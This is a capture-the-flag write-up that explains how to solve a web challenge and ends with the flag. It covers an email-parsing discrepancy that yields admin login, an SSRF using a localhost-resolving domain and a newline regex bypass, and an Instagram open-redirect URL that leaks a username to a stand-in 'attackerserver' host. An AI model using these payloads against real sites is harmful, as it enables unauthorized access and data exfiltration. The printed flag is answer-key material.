# Rejection

## Write-up
The flag has two parts: the first part is in the VIP search feature at `/internal/vip_search`, and the second part is the username of the Instagram account used to test the Instagram social media bot at `/social_media_bot`.

### Login
To access these features, we need to register and log in with an admin account. Let's solve this issue first.

We have the following code:
```python
# For now only admins can login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email_addr = request.form.get('email')
        password = request.form.get('password')
        
        user = User.query.filter_by(email=email_addr).first()
        
        if user and check_password_hash(user.password, password):
            user_role = user.role
            
            try:
                domain = email_addr.split('@')[-1]
                if domain == 'admin.managely.social':
                    user_role = 'admin'
            except:
                pass

            if user_role == 'admin':
                token = jwt.encode({
                    'user_id': user.id,
                    'role': user_role,
                    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=72)
                }, app.config['SECRET_KEY'], algorithm="HS256")
                
                resp = make_response(redirect(url_for('dashboard')))
                resp.set_cookie('auth_token', token)
                return resp
        
        flash("Invalid credentials", "danger")
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        email_addr = request.form.get('email')
        password = request.form.get('password')

        _, addr = email.utils.parseaddr(email_addr)
        email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

        if not addr:
            return render_template('register.html', error="No email address provided")
        
        if not bool(re.match(email_regex, addr)):
            return render_template('register.html', error="Invalid email address")
        
        if "admin.managely.social" in addr:
            return render_template('register.html', error="Registration restricted. Please use the created system admin account")
        
        if User.query.filter_by(username=username).first():
            return render_template('register.html', error="Username taken")
        
        if User.query.filter_by(email=email_addr).first():
            return render_template('register.html', error="Email taken")

        new_user = User(
            username=username,
            email=email_addr, 
            password=generate_password_hash(password),
            role='customer'
        )
        db.session.add(new_user)
        db.session.commit()
        
        flash("Registration successful, but the customer portal is under maintenance. You will receive an invitation link by next week.", "warning")
        return redirect(url_for('login'))
        
    return render_template('register.html')
```
At first glance, this looks contradictory and impossible, as we can only log in by having the random password of the seed user, which is impossible. We need to find a way to log in with an email that ends with `admin.managely.social`. The email checking in the two endpoints is different: in registration, it is done using `utils.parseaddr`, and in login, it is done using a simple split on the last `@`.

Here, we can think of an email parsing discrepancy between these two functions. By experimenting with how the email utils `parseaddr` function works, we can exploit some email special characters like `(` for comments and `,` as a separator to bypass this. Some bypass examples are: `collab@psres.net"@admin.managely.social`, `collab@psres.net(@admin.managely.social`, and `collab@psres.net,@admin.managely.social`. You can check this [issue](https://github.com/python/cpython/issues/102988) for more details.

### First part

To get the first part, we need to make a request to the `/internal/vip_search` endpoint, which only accepts requests from localhost. We need to get an SSRF in the internet link checker tool at `/check_link`, but we need to bypass the localhost filter. To do this, we can use other lesser-known domains that resolve to 127.0.0.1, such as `yoogle.com`.

Now we can reach the internal VIP search endpoint. The flag is in the bio of John Doe, but there is a check blocking us from searching for this user:
```python
# John Doe's information is top secret, should only be accessed from the database

    pattern = re.compile(r'^(?!.*John_Doe).*', flags=re.IGNORECASE)

    if not re.match(pattern, query):
        return "User not found", 403
```
We can bypass this check using a newline `%0a`, as `re.match()` only considers the first line. The payload to get the first part looks like this: `http://yoogle.com:8000/internal/vip_search?q=%0aJohn_Doe`.

### Second part

To get the second part, we can use an open redirect in Instagram to get the username of the test account:

`https://l.instagram.com/?u=https%3A%2F%2Fattackerserver/{username}%3Ffbclid%3DPAZXh0bgNhZW0CMTEAc3J0YwZhcHBfaWQMMjU2MjgxMDQwNTU4AAGnKQTFEaSl-keDUiYhJ1ZiulNBR_HQjqlPrZlLwW0s-L8nBV2bjHOplCd58Vs_aem_O0WqxRh-N21JVO4aCpBhvQ&e=AT0wVv7HjGUMHdtqCvJ078lVf36yiZdze6ajcFmIlh9gAbf3sNOg-AFVkSCD46kGdmGewfPSyeRM7RVGDyGsbnLfB9budm9VjfbofZoYOQ`

## Flag

`shellmates{COngRats_Y0U_muSt_be_4_GOOOO0D_HACkER_HuUuuh?_world_record_egg}`
